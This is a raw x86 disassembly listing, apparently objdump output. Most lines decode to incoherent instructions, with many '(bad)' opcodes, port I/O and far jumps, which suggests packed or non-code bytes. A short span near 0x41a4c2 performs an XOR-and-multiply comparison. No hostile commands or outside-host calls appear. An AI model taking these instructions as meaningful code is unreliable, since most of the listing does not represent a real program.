  41a124:	adc    BYTE PTR [ebx+0x22],bl
  41a127:	call   0x6b3afb75
  41a12c:	push   esp
  41a12d:	ds and dh,bh
  41a130:	inc    edx
  41a131:	loopne 0x41a183
  41a133:	sbb    eax,0x48163df6
  41a138:	mov    dl,ah
  41a13a:	xchg   esp,eax
  41a13b:	ds in  eax,0x7e
  41a13e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a140:	xchg   ebx,eax
  41a141:	mov    ch,0x16
  41a143:	daa    
  41a144:	and    al,0x5a
  41a146:	lock rol BYTE PTR [ecx-0xb],0x14
  41a14b:	mov    cs,WORD PTR [eax]
  41a14d:	sub    cl,cl
  41a14f:	(bad)  
  41a150:	lock mov ch,0xa6
  41a153:	fisub  WORD PTR [ebx+ebp*2+0x6dccde37]
  41a15a:	test   eax,0x607808b1
  41a15f:	ja     0x41a1c4
  41a161:	xor    al,0x42
  41a163:	xor    al,BYTE PTR [edi*8-0x23f6878a]
  41a16a:	mov    eax,0x513f3700
  41a16f:	outs   dx,DWORD PTR ds:[esi]
  41a170:	jmp    0x413a:0xc939fcbc
  41a177:	xchg   edi,eax
  41a178:	stos   BYTE PTR es:[edi],al
  41a179:	rol    DWORD PTR [ecx+0x77],1
  41a17c:	sti    
  41a17d:	dec    esi
  41a17e:	retf   0x98c9
  41a181:	adc    BYTE PTR [ebx+0x58d7f114],0x74
  41a188:	mov    WORD PTR [ebp+0x48],?
  41a18b:	stc    
  41a18c:	(bad)  
  41a18d:	fcmovnu st,st(6)
  41a18f:	mov    ds:0x8df2872,al
  41a194:	sbb    dl,BYTE PTR [edx+ebp*1-0x570e4600]
  41a19b:	std    
  41a19c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41a19d:	fadd   DWORD PTR [ebx]
  41a19f:	pop    eax
  41a1a0:	enter  0xf4d4,0x32
  41a1a4:	jg     0x41a182
  41a1a6:	inc    ebx
  41a1a7:	push   eax
  41a1a8:	pop    ss
  41a1a9:	pop    edx
  41a1aa:	fucomip st,st(7)
  41a1ac:	ret    
  41a1ad:	daa    
  41a1ae:	shl    DWORD PTR [edx+0x63],cl
  41a1b1:	sub    ah,0x1d
  41a1b4:	scas   al,BYTE PTR es:[edi]
  41a1b5:	hlt    
  41a1b6:	mov    eax,ds:0x66e2fbb8
  41a1bb:	or     eax,0xa47b026b
  41a1c0:	popa   
  41a1c1:	aas    
  41a1c2:	cli    
  41a1c3:	xor    BYTE PTR [eax+0x27],cl
  41a1c6:	(bad)  
  41a1c7:	pushf  
  41a1c8:	outs   dx,BYTE PTR ds:[esi]
  41a1c9:	out    0xb8,eax
  41a1cb:	pop    ds
  41a1cc:	inc    esp
  41a1cd:	jno    0x41a212
  41a1cf:	xchg   ecx,eax
  41a1d0:	jecxz  0x41a1cb
  41a1d2:	adc    DWORD PTR [edx+0x36],edi
  41a1d5:	mov    al,0x44
  41a1d7:	dec    eax
  41a1d8:	jge    0x41a179
  41a1da:	dec    ebx
  41a1db:	sub    edx,DWORD PTR [eax-0x77]
  41a1de:	add    BYTE PTR [esi],cl
  41a1e0:	loop   0x41a20a
  41a1e2:	push   cs
  41a1e3:	push   ecx
  41a1e4:	idiv   dl
  41a1e6:	sahf   
  41a1e7:	push   ebx
  41a1e8:	int    0x62
  41a1ea:	out    0x9c,eax
  41a1ec:	jmp    0x41a24f
  41a1ee:	pop    esi
  41a1ef:	retf   0x44aa
  41a1f2:	loopne 0x41a19b
  41a1f4:	cmp    ch,BYTE PTR es:[eax+esi*2-0x406b3775]
  41a1fc:	scas   eax,DWORD PTR es:[edi]
  41a1fd:	test   al,0x3f
  41a1ff:	(bad)  
  41a200:	push   ds
  41a201:	out    0xb0,al
  41a203:	mov    ah,0xa1
  41a205:	inc    eax
  41a206:	shl    DWORD PTR [esi+ebp*2+0x14],0x3f
  41a20b:	gs daa 
  41a20d:	inc    ebp
  41a20e:	pop    ds
  41a20f:	adc    al,0x8a
  41a211:	loopne 0x41a1ad
  41a213:	pop    ebp
  41a214:	aam    0xfc
  41a216:	dec    edi
  41a217:	frstor [ecx+ebx*4]
  41a21a:	inc    esp
  41a21b:	adc    ebp,DWORD PTR [esi+0x729d911e]
  41a221:	stc    
  41a222:	xor    DWORD PTR [edi-0x663f0f2d],ebp
  41a228:	stos   BYTE PTR es:[edi],al
  41a229:	or     ecx,ebx
  41a22b:	mov    cl,0xb8
  41a22d:	xchg   edx,eax
  41a22e:	add    al,0x42
  41a230:	xor    bl,0xc
  41a233:	mov    bl,0xf8
  41a235:	dec    ebx
  41a236:	cdq    
  41a237:	icebp  
  41a238:	xor    DWORD PTR [ebx],edi
  41a23a:	jp     0x41a293
  41a23c:	ret    
  41a23d:	lods   eax,DWORD PTR ds:[esi]
  41a23e:	pop    ebp
  41a23f:	xlat   BYTE PTR ds:[ebx]
  41a240:	xchg   ebp,eax
  41a241:	pop    DWORD PTR [edx+0x5f]
  41a244:	sbb    esp,DWORD PTR [edi-0x14]
  41a247:	int3   
  41a248:	jb     0x41a1e3
  41a24a:	push   cs
  41a24b:	push   edi
  41a24c:	xor    eax,0xcaa1bef9
  41a251:	fistp  WORD PTR ds:0x25d00445
  41a257:	ins    DWORD PTR es:[edi],dx
  41a258:	js     0x41a278
  41a25a:	ins    DWORD PTR es:[edi],dx
  41a25b:	into   
  41a25c:	scas   al,BYTE PTR es:[edi]
  41a25d:	(bad)  
  41a25f:	ja     0x41a2d3
  41a261:	(bad)  
  41a262:	cmp    eax,0x20c84376
  41a267:	push   edx
  41a268:	ret    
  41a269:	or     eax,0x30f19d24
  41a26e:	sub    dh,BYTE PTR [edx-0x11]
  41a271:	(bad)  
  41a272:	sub    eax,0x5fa61e81
  41a277:	(bad)  
  41a278:	jne    0x41a2c9
  41a27a:	jle    0x41a25f
  41a27c:	jge    0x41a2ac
  41a27e:	sub    al,0xde
  41a280:	mov    eax,0x22433a58
  41a285:	in     al,0xae
  41a287:	out    dx,eax
  41a288:	xchg   WORD PTR [edi+0x44],ax
  41a28c:	sbb    BYTE PTR [edi+0x62eee995],bl
  41a292:	push   0x31
  41a294:	hlt    
  41a295:	icebp  
  41a296:	dec    edx
  41a297:	shl    BYTE PTR [eax],0xe8
  41a29a:	test   eax,0x3d2c6b9a
  41a29f:	call   DWORD PTR [eax+0x1b35ea15]
  41a2a5:	int3   
  41a2a6:	mov    ah,0xcb
  41a2a8:	nop
  41a2a9:	push   0x8
  41a2ab:	jb     0x41a2c3
  41a2ad:	dec    esi
  41a2ae:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a2af:	daa    
  41a2b0:	adc    bh,dl
  41a2b2:	pop    ebx
  41a2b3:	xor    esi,DWORD PTR [ecx]
  41a2b5:	cmp    BYTE PTR [ebx-0x77],ch
  41a2b8:	bound  edx,QWORD PTR [esi+esi*8]
  41a2bb:	ret    
  41a2bc:	or     ebx,DWORD PTR [edi-0x39e4a056]
  41a2c2:	pop    ecx
  41a2c3:	xchg   ebx,eax
  41a2c4:	push   es
  41a2c5:	sahf   
  41a2c6:	imul   eax,ebx,0x53c4efeb
  41a2cc:	fwait
  41a2cd:	cwde   
  41a2ce:	test   eax,0x3bc08c4f
  41a2d3:	sub    BYTE PTR gs:[edx+0x1c],dh
  41a2d7:	cmp    eax,0xdbff1673
  41a2dc:	pusha  
  41a2dd:	iret   
  41a2de:	faddp  st(6),st
  41a2e0:	dec    ebx
  41a2e1:	jp     0x41a267
  41a2e3:	daa    
  41a2e4:	inc    edx
  41a2e5:	mov    esp,0xed7b6974
  41a2ea:	scas   eax,DWORD PTR es:[edi]
  41a2eb:	out    0x52,eax
  41a2ed:	imul   DWORD PTR ds:0xdb11d4f
  41a2f3:	ins    DWORD PTR es:[edi],dx
  41a2f4:	data16 scas al,BYTE PTR es:[edi]
  41a2f6:	mov    esi,0x6acc431a
  41a2fb:	retf   
  41a2fc:	dec    esp
  41a2fd:	rcl    DWORD PTR [ebp-0x52],0x26
  41a301:	cmp    ecx,DWORD PTR [ebp+0x64d733df]
  41a307:	test   DWORD PTR ds:0xe7dc9863,ebp
  41a30d:	pop    edi
  41a30e:	in     al,0xdc
  41a310:	imul   esp,DWORD PTR [ecx+0x74],0x3a
  41a314:	jge    0x41a2d8
  41a316:	test   edi,esp
  41a318:	or     bh,0xac
  41a31b:	pop    es
  41a31c:	cmp    al,0x8f
  41a31e:	popf   
  41a31f:	mov    dl,0x70
  41a321:	push   0xffffffb3
  41a323:	(bad)  
  41a324:	mov    bl,0x12
  41a326:	add    DWORD PTR [esi+0x78d72be0],edx
  41a32c:	rcr    BYTE PTR [ecx-0x47307c98],1
  41a332:	jno    0x41a2ec
  41a334:	lea    ebx,[edx-0x27a04deb]
  41a33a:	rol    DWORD PTR [ebp-0x31],1
  41a33d:	mov    dl,dl
  41a33f:	add    bl,al
  41a341:	icebp  
  41a342:	pop    esi
  41a343:	(bad)  
  41a344:	push   esi
  41a345:	and    eax,0x9138c7a3
  41a34a:	jbe    0x41a350
  41a34c:	in     al,0x9e
  41a34e:	rcl    BYTE PTR [ecx],0xe7
  41a351:	mov    DWORD PTR [edx-0x1b],ecx
  41a354:	add    DWORD PTR [ecx],ebp
  41a356:	add    ecx,DWORD PTR [eax+0x63799617]
  41a35c:	je     0x41a322
  41a35e:	mov    ds:0x912ce039,al
  41a363:	jle    0x41a32b
  41a365:	sub    ah,ah
  41a367:	add    DWORD PTR [eax+0x2a],esp
  41a36a:	push   es
  41a36b:	out    dx,al
  41a36c:	inc    DWORD PTR ds:0x6bdcaf8f
  41a372:	shrd   DWORD PTR [edi+esi*1],esi,cl
  41a376:	aaa    
  41a377:	mov    al,ds:0xd912c030
  41a37c:	ret    0xae3e
  41a37f:	fwait
  41a380:	inc    edx
  41a381:	jmp    0x41a341
  41a383:	cmp    eax,0x74b337e6
  41a388:	xchg   edx,eax
  41a389:	push   ebx
  41a38a:	test   al,0x18
  41a38c:	or     BYTE PTR [ecx+0x18],bl
  41a38f:	addr16 pop ebx
  41a391:	jne    0x41a377
  41a393:	cdq    
  41a394:	test   BYTE PTR [ecx+edi*1+0x63],bh
  41a398:	jnp    0x41a350
  41a39a:	sub    edx,esi
  41a39c:	and    al,0x62
  41a39e:	or     ah,BYTE PTR [edi+0x64]
  41a3a1:	push   ds
  41a3a2:	cmp    al,0x9c
  41a3a4:	inc    edx
  41a3a5:	mov    edi,esp
  41a3a7:	or     DWORD PTR ds:0x3cdb65c,edi
  41a3ad:	ja     0x41a3e5
  41a3af:	ins    BYTE PTR es:[edi],dx
  41a3b0:	daa    
  41a3b1:	test   al,0xed
  41a3b3:	pusha  
  41a3b4:	sub    al,0x35
  41a3b6:	fninit 
  41a3b8:	dec    eax
  41a3b9:	adc    DWORD PTR [edx],ebx
  41a3bb:	sar    edi,cl
  41a3bd:	jns    0x41a357
  41a3bf:	push   ss
  41a3c0:	inc    esi
  41a3c1:	sbb    dl,BYTE PTR [esi]
  41a3c3:	mul    BYTE PTR [edi-0x393da43c]
  41a3c9:	arpl   bx,di
  41a3cb:	ds pusha 
  41a3cd:	dec    ebx
  41a3ce:	stc    
  41a3cf:	jo     0x41a420
  41a3d1:	adc    eax,0xa231949e
  41a3d6:	aaa    
  41a3d7:	sahf   
  41a3d8:	es add al,0x99
  41a3db:	mov    esp,0x9c7f022e
  41a3e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a3e1:	out    dx,al
  41a3e2:	loopne 0x41a41c
  41a3e4:	jmp    0x4ff43457
  41a3e9:	and    eax,0x8d18aa43
  41a3ee:	mov    ebx,0x286b1d15
  41a3f3:	and    dl,BYTE PTR [edi+0x2882dd51]
  41a3f9:	and    ebx,DWORD PTR [eax]
  41a3fb:	test   al,0x5e
  41a3fd:	sub    edi,DWORD PTR [edi+0x3e]
  41a400:	inc    eax
  41a401:	je     0x41a45f
  41a403:	jle    0x41a470
  41a405:	jg     0x41a43f
  41a407:	mov    eax,ds:0x61c5125d
  41a40c:	inc    eax
  41a40d:	mov    eax,0x5b92a641
  41a412:	in     al,0x62
  41a414:	ret    
  41a415:	jg     0x41a46b
  41a417:	jno    0x41a460
  41a419:	sbb    al,ah
  41a41b:	and    BYTE PTR [edi-0x5a259dc],bl
  41a421:	mov    dl,0x3e
  41a423:	cmc    
  41a424:	jp     0x41a412
  41a426:	push   0x7e175766
  41a42b:	sub    ch,bl
  41a42d:	(bad)  
  41a42f:	dec    edi
  41a430:	dec    ebp
  41a431:	and    eax,DWORD PTR [edi]
  41a433:	loopne 0x41a3e8
  41a435:	stos   DWORD PTR es:[edi],eax
  41a436:	add    DWORD PTR [edi+0x2adb01b4],edx
  41a43c:	mov    fs,WORD PTR [ebx+ebx*4+0x51]
  41a440:	repnz repz adc DWORD PTR [eax+0x7d],ecx
  41a445:	sub    BYTE PTR [edi+ebp*8],dh
  41a448:	aad    0xa6
  41a44a:	mov    bh,0x17
  41a44c:	mov    eax,ds:0x57839f87
  41a451:	in     eax,0xe8
  41a453:	repz jecxz 0x41a417
  41a456:	pusha  
  41a457:	sbb    eax,0x329e4f57
  41a45c:	inc    ebx
  41a45d:	ficom  WORD PTR [ebp+0x26]
  41a460:	mov    ds:0xff56937c,al
  41a465:	pop    es
  41a466:	iret   
  41a467:	xlat   BYTE PTR ds:[ebx]
  41a468:	adc    BYTE PTR [edx],ah
  41a46a:	mov    ch,0xdb
  41a46c:	fmul   DWORD PTR [eax]
  41a46e:	(bad)  
  41a46f:	out    0x5d,al
  41a471:	or     al,BYTE PTR [esi]
  41a473:	js     0x41a40a
  41a475:	loopne 0x41a44f
  41a477:	mov    ebx,0x992ca1c8
  41a47c:	adc    eax,0x7abfaea8
  41a481:	add    eax,0x55d91e37
  41a486:	sub    bl,cl
  41a488:	lock cmp al,0x89
  41a48b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a48c:	xchg   ecx,eax
  41a48d:	adc    DWORD PTR [edi+0x6d],eax
  41a490:	push   es
  41a491:	fcmovbe st,st(1)
  41a493:	lea    ebp,[ecx+eiz*4-0x7b687145]
  41a49a:	adc    al,0x90
  41a49c:	mov    ds,WORD PTR [ebp+0x70]
  41a49f:	xchg   ebp,eax
  41a4a0:	rcl    al,0x2
  41a4a3:	and    eax,0x7972e760
  41a4a8:	aaa    
  41a4a9:	pop    ebp
  41a4aa:	and    al,0x3f
  41a4ac:	fs nop
  41a4ae:	sub    DWORD PTR [eax+0x76],0x33020cba
  41a4b5:	repnz add eax,ecx
  41a4b8:	add    esi,ecx
  41a4ba:	imul   eax,esi
  41a4bd:	jmp    0x41c8af
  41a4c2:	mov    eax,DWORD PTR [ebp+0xc]
  41a4c5:	mov    eax,DWORD PTR [eax+0x78]
  41a4c8:	mov    DWORD PTR [ebp+0xc],eax
  41a4cb:	mov    eax,DWORD PTR [ebp-0x4]
  41a4ce:	mov    esi,DWORD PTR [ebp-0x8]
  41a4d1:	xor    eax,edx
  41a4d3:	xor    esi,edx
  41a4d5:	add    eax,ecx
  41a4d7:	add    esi,ecx
  41a4d9:	imul   eax,esi
  41a4dc:	mov    esi,DWORD PTR [ebp+0xc]
  41a4df:	cmp    esi,eax
  41a4e1:	mov    eax,DWORD PTR [ebp-0x4]
  41a4e4:	je     0x4180fd
  41a4ea:	xor    eax,edx
  41a4ec:	jmp    0x41c89e
  41a4f1:	aaa    
  41a4f2:	dec    eax
  41a4f3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a4f4:	sbb    DWORD PTR [edi-0x67],esp
  41a4f7:	xchg   DWORD PTR [eax],ebp
  41a4f9:	and    bl,BYTE PTR [ecx+eiz*8-0x2221c355]
  41a500:	push   edi
  41a501:	dec    eax
  41a502:	add    BYTE PTR [ecx+0x62],ah
  41a505:	int    0x5f
  41a507:	bound  esp,QWORD PTR [edx-0x4a]
  41a50a:	sbb    eax,0x60b5d6c6
  41a50f:	div    BYTE PTR [edx]
  41a511:	fwait
  41a512:	xchg   esp,eax
  41a513:	cmc    
  41a514:	pop    ss
  41a515:	push   edi
  41a516:	inc    ebp
  41a517:	mov    fs,edx
  41a519:	aaa    
  41a51a:	push   ds
  41a51b:	rol    DWORD PTR [edx+0x2f],1
  41a51e:	repz fdivr st(6),st
  41a521:	add    al,0x1b
  41a523:	mov    ebx,0xcb1e52da
  41a528:	scas   eax,DWORD PTR es:[edi]
  41a529:	in     eax,0x26
  41a52b:	push   0x3
  41a52d:	and    BYTE PTR [edi-0x2e],dh
  41a530:	fcomp  st(6)
  41a532:	jecxz  0x41a55e
  41a534:	dec    ecx
  41a535:	stos   BYTE PTR es:[edi],al
  41a536:	push   ds
  41a537:	push   ds
  41a538:	arpl   WORD PTR [edi-0x5c34972a],bp
  41a53e:	aas    
  41a53f:	(bad)  
  41a540:	cmp    BYTE PTR [edx+0x5e7a3b2f],bl
  41a546:	retf   0xbbd5
  41a549:	int3   
  41a54a:	sbb    eax,0xdf737787
  41a54f:	pop    edx
  41a550:	sbb    eax,0xf455be31
  41a555:	jl     0x41a4d7
  41a557:	inc    ebx
  41a558:	pushf  
  41a559:	pop    esi
  41a55a:	mov    esp,0x17b01748
  41a55f:	add    BYTE PTR [eax-0x6be6ecd8],ah
  41a565:	imul   esi,DWORD PTR [ecx-0x4982afd3],0xffffff91
  41a56c:	sub    eax,0xa28cfd6e
  41a571:	retf   
  41a572:	or     al,0x46
  41a574:	(bad)  
  41a575:	mov    esp,0xc683f981
  41a57a:	jmp    0x69c4:0xcf6b1c2b
  41a581:	jl     0x41a546
  41a583:	push   esi
  41a584:	xchg   DWORD PTR [edi+0x29],ebp
  41a587:	loop   0x41a5a5
  41a589:	mov    WORD PTR [esi+0xe],ss
  41a58c:	call   0x32b4:0x137fad45
  41a593:	std    
  41a594:	add    cl,BYTE PTR [ebx-0x49]
  41a597:	mov    ch,cl
  41a599:	push   ebp
  41a59a:	or     bl,BYTE PTR [esi]
  41a59c:	push   ebx
  41a59d:	mov    ?,WORD PTR [esi-0x1d]
  41a5a0:	pushf  
  41a5a1:	sbb    al,0x88
  41a5a3:	or     edi,edi
  41a5a5:	hlt    
  41a5a6:	outs   dx,DWORD PTR ds:[esi]
  41a5a7:	ror    DWORD PTR [ebx],1
  41a5a9:	retf   
  41a5aa:	pop    esp
  41a5ab:	pop    ebp
  41a5ac:	retf   0x7a20
  41a5af:	fdiv   DWORD PTR [edx]
  41a5b1:	pop    ds
  41a5b2:	add    DWORD PTR [eax+0x74],0x38acadd7
  41a5b9:	or     DWORD PTR [edi+0x54],ebp
  41a5bc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a5bd:	push   ds
  41a5be:	pop    edi
  41a5bf:	lahf   
  41a5c0:	xor    DWORD PTR [esi],esp
  41a5c2:	mov    ds:0x7b6e8127,al
  41a5c7:	or     eax,eax
  41a5c9:	xchg   edi,eax
  41a5ca:	in     eax,dx
  41a5cb:	dec    ebx
  41a5cc:	inc    edi
  41a5cd:	mov    ds:0xd550c409,al
  41a5d2:	mov    dh,0x5f
  41a5d4:	add    DWORD PTR [ecx],ecx
  41a5d6:	test   BYTE PTR [eax-0x69],cl
  41a5d9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41a5da:	cmp    eax,0x1b4fdfc
  41a5df:	pushf  
  41a5e0:	jecxz  0x41a642
  41a5e2:	adc    BYTE PTR [ecx],al
  41a5e4:	jae    0x41a62e
  41a5e6:	inc    edi
  41a5e7:	inc    esp
  41a5e8:	mov    ds:0xf54c6e9,al
  41a5ed:	stc    
  41a5ee:	into   
  41a5ef:	aaa    
  41a5f0:	(bad)  
  41a5f1:	jne    0x41a618
  41a5f3:	jns    0x41a5c2
  41a5f5:	jns    0x41a5e1
  41a5f7:	sub    BYTE PTR [ecx-0xe],0xd0
  41a5fb:	add    edi,0xbc523d5c
  41a601:	dec    ebx
  41a602:	iret   
  41a603:	xor    bl,BYTE PTR [eax+0x1e]
  41a606:	mov    ah,0xa8
  41a608:	xchg   esi,eax
  41a609:	in     eax,0xaa
  41a60b:	mov    eax,ds:0xc291e30d
  41a610:	repz jge 0x41a5d0
  41a613:	inc    ebp
  41a614:	aam    0xca
  41a616:	(bad)  
  41a617:	mov    ch,0x27
  41a619:	mov    bh,0x19
  41a61b:	xchg   DWORD PTR ds:0x5f2869e3,edx
  41a621:	dec    edi
  41a622:	or     eax,0xb29ed53f
  41a627:	ret    0x9cfa
  41a62a:	mov    eax,ds:0xdf10c451
  41a62f:	test   ah,dl
  41a631:	push   ds
  41a632:	mov    eax,ds:0xb676c781
  41a637:	retf   0xe782
  41a63a:	xor    al,0x9b
  41a63c:	fild   QWORD PTR [ebp+0xd]
  41a63f:	pop    ebx
  41a640:	inc    esi
  41a641:	rcr    BYTE PTR [eax],cl
  41a643:	pop    es
  41a644:	int    0x41
  41a646:	rol    DWORD PTR [eax],cl
  41a648:	cli    
  41a649:	clc    
  41a64a:	mov    esi,0xe6c8654a
  41a64f:	adc    DWORD PTR [eax+eax*2-0x5271c373],esi
  41a656:	lea    eax,[ecx+ecx*1]
  41a659:	stos   DWORD PTR es:[edi],eax
  41a65a:	cld    
  41a65b:	in     eax,dx
  41a65c:	xor    eax,0xc7cce7e0
  41a661:	(bad)  
  41a662:	mov    ds:0xe893d61c,al
  41a667:	inc    eax
  41a668:	in     al,0x83
  41a66a:	rcl    DWORD PTR ds:0x7664009a,0x58
  41a671:	loopne 0x41a685
  41a673:	hlt    
  41a674:	push   eax
  41a675:	push   0x2b
  41a677:	cli    
  41a678:	shl    BYTE PTR cs:[ebx],1
  41a67b:	sahf   
  41a67c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41a67d:	dec    eax
  41a67e:	pushf  
  41a67f:	inc    esp
  41a680:	xchg   ecx,eax
  41a681:	test   DWORD PTR [ebp+0x26],esi
  41a684:	xor    bl,BYTE PTR [ebp+0x17915691]
  41a68a:	in     al,0xd6
  41a68c:	clc    
  41a68d:	and    BYTE PTR [ebx-0x3be76b08],ch
  41a693:	mov    bl,0xd5
  41a695:	int3   
  41a696:	or     al,bh
  41a698:	lods   al,BYTE PTR ds:[esi]
  41a699:	in     eax,dx
  41a69a:	adc    BYTE PTR [esi+0x5b],dh
  41a69d:	cmp    eax,0x69044ef7
  41a6a2:	bound  ebp,QWORD PTR [ebp-0x6b4915fc]
  41a6a8:	mov    ds:0x4167f126,al
  41a6ad:	test   al,0x1f
  41a6af:	mov    bh,0x9d
  41a6b1:	xchg   edi,esi
  41a6b3:	or     eax,0x46a74e59
  41a6b8:	fcmovne st,st(5)
  41a6ba:	and    edx,DWORD PTR [ecx]
  41a6bc:	daa    
  41a6bd:	push   es
  41a6be:	pop    si
  41a6c0:	data16 fisubr DWORD PTR gs:[esp+ebp*2-0x2a]
  41a6c6:	arpl   WORD PTR ds:0xc03de7b6,si
  41a6cc:	add    ecx,ecx
  41a6ce:	repz xor BYTE PTR [esi-0x65],al
  41a6d2:	dec    ecx
  41a6d3:	lods   eax,DWORD PTR ds:[esi]
  41a6d4:	aad    0x32
  41a6d6:	lock icebp 
  41a6d8:	cli    
  41a6d9:	sbb    edx,DWORD PTR [ebx+0x4d]
  41a6dc:	ja     0x41a70b
  41a6de:	fcmovnb st,st(4)
  41a6e0:	add    eax,0xb0456881
  41a6e5:	clc    
  41a6e6:	mov    ds:0x9c7efcca,al
  41a6eb:	add    DWORD PTR [esi],ecx
  41a6ed:	or     DWORD PTR [esi+0x2c],esi
  41a6f0:	add    al,0x25
  41a6f2:	mov    ebx,0x90e93adf
  41a6f7:	cdq    
  41a6f8:	sti    
  41a6f9:	mov    ds:0x5191c3f4,eax
  41a6fe:	xchg   ebx,eax
  41a6ff:	imul   edx,DWORD PTR [eax],0xffffff9b
  41a702:	dec    edx
  41a703:	sbb    al,0xad
  41a705:	add    al,0xb4
  41a707:	rol    DWORD PTR [edx],cl
  41a709:	and    esi,DWORD PTR [edx+edi*8-0x6426d971]
  41a710:	cmp    ch,BYTE PTR [edx]
  41a712:	fimul  DWORD PTR [edx+0x5c]
  41a715:	(bad)  
  41a716:	sbb    edx,DWORD PTR [ebx+0x214ed6d1]
  41a71c:	mov    dl,0x56
  41a71e:	mov    bl,0xb4
  41a720:	push   ebp
  41a721:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41a722:	mov    ebx,0x5ae6c959
  41a727:	popa   
  41a728:	adc    ecx,esi
  41a72a:	test   eax,0x90e9b725
  41a72f:	sbb    ebx,DWORD PTR [edx+0x11]
  41a732:	sub    dl,BYTE PTR [edx-0x4f8aaf8]
  41a738:	adc    eax,DWORD PTR [eax]
  41a73a:	cs aaa 
  41a73c:	cmp    al,0x4d
  41a73e:	cmp    edi,DWORD PTR [ebx-0x53e50a60]
  41a744:	in     eax,0x1a
  41a746:	inc    esp
  41a747:	nop
  41a748:	push   esi
  41a749:	mov    eax,ds:0x737113bc
  41a74e:	dec    eax
  41a74f:	outs   dx,DWORD PTR ds:[esi]
  41a750:	repz rcr al,cl
  41a753:	jmp    0x49e3:0x526f5c87
  41a75a:	push   esi
  41a75b:	daa    
  41a75c:	or     edx,edx
  41a75e:	add    BYTE PTR [ecx-0x13],0x17
  41a762:	out    dx,al
  41a763:	cmc    
  41a764:	pusha  
  41a765:	cmp    esp,edi
  41a767:	jno    0x41a6fc
  41a769:	adc    BYTE PTR [esi+0x7c84c73e],dl
  41a76f:	xchg   ecx,eax
  41a770:	push   esi
  41a771:	lea    edx,[ecx+0xeab69a3]
  41a777:	ret    
  41a778:	inc    ecx
  41a779:	and    BYTE PTR [ecx+0xd],0x86
  41a77d:	dec    ebx
  41a77e:	sub    ecx,ebx
  41a780:	fisttp DWORD PTR [ebp-0x3]
  41a783:	ja     0x41a709
  41a785:	xchg   esp,eax
  41a786:	mov    dl,0xc2
  41a788:	or     eax,0xf3274d00
  41a78d:	scas   eax,DWORD PTR es:[edi]
  41a78e:	aas    
  41a78f:	sti    
  41a790:	mov    ebx,DWORD PTR [edi+0xa74f6c8]
  41a796:	int3   
  41a797:	fistp  WORD PTR [esi]
  41a799:	push   esp
  41a79a:	sub    BYTE PTR [edi+0x4f2543ed],ah
  41a7a0:	clc    
  41a7a1:	jb     0x41a7c4
  41a7a3:	out    dx,al
  41a7a4:	test   BYTE PTR [ebx],dh
  41a7a6:	fwait
  41a7a7:	or     ebx,esi
  41a7a9:	outs   dx,BYTE PTR ds:[esi]
  41a7aa:	fcmovnu st,st(6)
  41a7ac:	sub    al,0x1a
  41a7ae:	jo     0x41a7d7
  41a7b0:	sub    al,bl
  41a7b2:	inc    edi
  41a7b3:	xor    cl,cl
  41a7b5:	jmp    0xb9aaf709
  41a7ba:	aas    
  41a7bb:	pop    esi
  41a7bc:	test   BYTE PTR [eax+ebp*4+0x78c65fff],bh
  41a7c3:	ret    0x91cb
  41a7c6:	dec    BYTE PTR [ebp-0x998feb3]
  41a7cc:	gs popa 
  41a7ce:	sti    
  41a7cf:	push   ebx
  41a7d0:	aad    0xb8
  41a7d2:	mov    edx,0x727d9592
  41a7d7:	ret    0xdd
  41a7da:	push   eax
  41a7db:	adc    eax,0x61821565
  41a7e0:	sbb    eax,0x691dad2e
  41a7e5:	add    esp,DWORD PTR [eax-0x35f67b66]
  41a7eb:	xchg   edi,eax
  41a7ec:	icebp  
  41a7ed:	inc    ecx
  41a7ee:	jle    0x41a7f6
  41a7f0:	ins    DWORD PTR es:[edi],dx
  41a7f1:	jmp    0xb527961b
  41a7f6:	out    dx,eax
  41a7f7:	dec    esi
  41a7f8:	dec    ebx
  41a7f9:	push   ebx
  41a7fa:	and    DWORD PTR [ebx+0x6a8b35a1],esi
  41a800:	mov    DWORD PTR [ebp-0x270cd36b],eax
  41a806:	push   esp
  41a807:	mov    al,ds:0xdc1732a2
  41a80c:	adc    eax,0xd7601f1a
  41a811:	or     edi,DWORD PTR [ebp+0x57]
  41a814:	loop   0x41a7c5
  41a816:	bound  edi,QWORD PTR [ebp+0x69]
  41a819:	fst    DWORD PTR ds:0xaab16b68
  41a81f:	and    DWORD PTR [edi+ebx*1],edx
  41a822:	std    
  41a823:	outs   dx,DWORD PTR ds:[esi]
  41a824:	sbb    ebx,ecx
  41a826:	sub    BYTE PTR [ebx-0x6c892801],bh
  41a82c:	loop   0x41a887
  41a82e:	xor    BYTE PTR [edx+0xe],ah
  41a831:	jmp    0x1125:0xe48d4e49
  41a838:	lods   eax,DWORD PTR ds:[esi]
  41a839:	pusha  
  41a83a:	shl    DWORD PTR [edx-0x789dbcc8],1
  41a840:	adc    esp,edx
  41a842:	add    DWORD PTR ds:0x7cb3574,edi
  41a848:	xchg   ebp,eax
  41a849:	and    DWORD PTR [ebp+0x74],ebx
  41a84c:	daa    
  41a84d:	adc    al,0x23
  41a84f:	dec    ebx
  41a850:	or     DWORD PTR [eax+edi*2-0x47af4e87],edx
  41a857:	cmovp  edx,edx
  41a85a:	mov    ah,0x58
  41a85c:	and    bh,BYTE PTR [edx]
  41a85e:	(bad)  
  41a85f:	jno    0x41a843
  41a861:	push   ss
  41a862:	inc    BYTE PTR [eax+0x13d1884]
  41a868:	mov    ebx,0x7891dc34
  41a86d:	inc    eax
  41a86e:	sub    edx,edi
  41a870:	push   ebx
  41a871:	inc    ebx
  41a872:	pop    ecx
  41a873:	inc    ebp
  41a874:	sbb    dh,ah
  41a876:	ja     0x41a8d7
  41a878:	pusha  
  41a879:	fs mov ecx,0xbe6a775
  41a87f:	and    al,0x6d
  41a881:	pushf  
  41a882:	xchg   edi,eax
  41a883:	adc    BYTE PTR [eax],bl
  41a885:	jecxz  0x41a812
  41a887:	stos   DWORD PTR es:[edi],eax
  41a888:	mov    al,0xd3
  41a88a:	adc    esi,DWORD PTR [ecx+ecx*4]
